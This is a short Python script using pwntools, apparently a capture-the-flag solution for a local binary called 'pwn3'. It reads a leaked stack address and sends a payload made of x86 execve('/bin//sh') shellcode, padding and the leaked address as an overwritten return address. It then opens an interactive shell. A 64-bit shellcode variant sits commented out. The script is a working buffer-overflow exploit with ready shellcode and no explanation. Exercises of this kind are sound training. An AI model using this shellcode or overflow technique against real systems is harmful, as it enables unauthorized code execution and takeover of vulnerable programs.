from pwn import *

p = process('./pwn3')


p.recvuntil(b"your journey ")
addr = p.recvuntil(b"!\n")[:-2]
print(addr)

# shell_please = b"\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"

shell_please = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"


payload = shell_please
payload += b"A" * (0x12e - len(shell_please))
payload += p32(int(addr,16))

p.sendline(payload)
p.interactive()
